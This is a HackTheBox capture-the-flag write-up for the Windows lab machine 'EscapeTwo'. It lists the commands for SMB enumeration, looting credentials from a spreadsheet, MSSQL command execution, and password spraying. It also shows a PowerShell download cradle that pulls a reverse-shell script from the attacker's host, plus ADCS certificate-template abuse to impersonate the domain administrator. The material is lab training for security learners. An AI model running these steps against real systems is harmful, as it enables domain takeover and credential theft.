# HackTheBox Writeup: EscapeTwo

**Difficoltà:** Easy
**OS:** Windows
**Date:** 25/03/2026

## 1. Information Gathering & Reconnaissance
IP target: 10.129.232.128
Credentials: rose:KxEPkKe6R8su

### Port Scanning
We begin by mapping the open ports and services on the target using Nmap:

`sudo nmap -sC -sV -vv -oA nmap/escapetwo 10.129.232.128`

<img width="1174" height="817" alt="image" src="https://github.com/user-attachments/assets/0c2bc363-9595-4511-9521-80bd9519f81f" />


## 2. Enumeration & Initial Access
### SMB & Authentication Mechanisms

Let's look at all the shares on the server and find an interesting one.
`nxc smb dc01.sequel.htb -u rose -p KxEPkKe6R8su --shares`

<img width="1394" height="220" alt="image" src="https://github.com/user-attachments/assets/888f6273-a6ed-4975-a849-0cf442c974b5" />


`nxc smb dc01.sequel.htb -u rose -p KxEPkKe6R8su --users`
<img width="1410" height="243" alt="image" src="https://github.com/user-attachments/assets/b15e5298-9865-40dd-8209-1c519b423c7d" />

Given these users, there will most likely be a transition to MSSQL

`smbclient "//dc01.sequel.htb/Accounting Department" -U 'rose%KxEPkKe6R8su'`

<img width="1141" height="240" alt="image" src="https://github.com/user-attachments/assets/0239f34b-f0af-414e-a3d0-1873bd39fb70" />

After downloading the .xlsx files, we can unzip them because .xlsx files are compressed XML files.

`unzip accounts.xlsx`

<img width="1896" height="138" alt="image" src="https://github.com/user-attachments/assets/f9dd118c-ab0a-4277-8f4e-d562b5a7587d" />

`cat sharedStrings.xml | sed 's/></>\n</g' | sed 's/<[^>]*>//g' | grep -v '^$'`
<img width="823" height="406" alt="image" src="https://github.com/user-attachments/assets/2a919e58-9044-466e-84ad-5414df374603" />

After filtering out some noise from the files we downloaded from the file-sharing sites, we found some users to test.


`nxc mssql 10.129.232.128 dc01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth     `
`nxc mssql 10.129.232.128 dc01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x whoami`
<img width="1212" height="295" alt="image" src="https://github.com/user-attachments/assets/feb8f657-ae2a-4e78-8a68-df9b6979f7f7" />
Let's try to establish a reverse shell to keep things cleaner 

`nxc mssql 10.129.232.128 dc01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X 'IEX(New-Object Net.WebClient).downloadString("http://10.10.14.142:8000/shell.ps1")'`

<img width="1579" height="759" alt="image" src="https://github.com/user-attachments/assets/7bb9d6be-e709-42e2-af2c-2d00fdf22559" />

We don't have any SED vulnerabilities or privileges to impersonate a user, We don't have any SED bugs or privileges to impersonate a user, so we can't carry out any “potatoes” attacks.

<img width="570" height="478" alt="image" src="https://github.com/user-attachments/assets/7bd45e0f-a587-473d-9f1d-130ee97a31a6" />

siamo riusciti a trovare una la password di sql_svc. ora quello che mi viene da pensare è fare password spraying con gli users che abbiamo trovato enumerando smb

`nxc smb 10.129.232.128 -u final.txt -p 'WqSZAF6CysDQbGb3' --continue-on-success`

<img width="1431" height="191" alt="image" src="https://github.com/user-attachments/assets/bb312eca-db6c-4683-8cc3-990ec1d7149d" />

OK, now let's see what we can do with the user Ryan

<img width="1898" height="191" alt="image" src="https://github.com/user-attachments/assets/f115e530-7b34-4e92-88f6-e550a650887a" />

OK, the next step is to map the domain using Bloodhound, so let's load Bloodhound into the shell


`curl http://10.10.14.142:8000/SharpHound.exe -o sh.exe`

<img width="1226" height="391" alt="image" src="https://github.com/user-attachments/assets/5ac33eab-14b9-4613-a70e-5d69cf0528c4" />

Before taking control of CS_SVC, let's see if we can find any vulnerable certificates.

`certipy-ad find -u rose@sequel.htb -p  'KxEPkKe6R8su' -stdout`

<img width="724" height="284" alt="image" src="https://github.com/user-attachments/assets/61eda8ec-c9e2-4425-a792-e387e9660e35" />

We find 33 certificates, but we see that users in the CERT PUBLISHER group have control over the certificate templates. Therefore, they can modify them, making them vulnerable

`owneredit.py -action write -new-owner ryan -target ca_svc -dc-ip 10.129.232.128 sequel.htb/ryan:'WqSZAF6CysDQbGb3'`
<img width="925" height="151" alt="image" src="https://github.com/user-attachments/assets/81ee873c-64a1-4819-a8af-4125e299aee2" />

`dacledit.py -action write -rights FullControl -principal ryan -target ca_svc -dc-ip 10.129.232.128 sequel.htb/ryan:'WqSZAF6CysDQbGb3'`

<img width="936" height="108" alt="image" src="https://github.com/user-attachments/assets/a451c8f9-60fe-45f5-a5d8-03d6c19b2a28" />

`certipy-ad shadow auto -username ryan@sequel.htb -password WqSZAF6CysDQbGb3 -account ca_svc -dc-ip 10.129.232.128 `

<img width="940" height="396" alt="image" src="https://github.com/user-attachments/assets/075dfa25-149e-4e7b-99a6-af280cdacea6" />

`nxc smb 10.129.232.128 -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce`

<img width="937" height="79" alt="image" src="https://github.com/user-attachments/assets/fd216993-e3cc-4a20-9e26-554ca22fd1a8" />

`certipy-ad template -u ca_svc@sequel.htb \
  -hashes 3b181b914e7a9d5508ea1e20bc2b7fce \
  -template DunderMifflinAuthentication \
  -write-configuration DunderMifflinAuthentication.json`

<img width="940" height="281" alt="image" src="https://github.com/user-attachments/assets/2e541235-2c77-45e3-82f4-a280ff502fc4" />


`certipy-ad req -u ca_svc@sequel.htb \
  -hashes 3b181b914e7a9d5508ea1e20bc2b7fce \
  -ca sequel-DC01-CA \
  -template DunderMifflinAuthentication \
  -upn administrator@sequel.htb \
  -target-ip 10.129.232.128`

  <img width="713" height="281" alt="image" src="https://github.com/user-attachments/assets/8ca41e5c-14be-47d4-9853-225a3dcfb58d" />


``
``
``
``
``
``
``
``
``
``
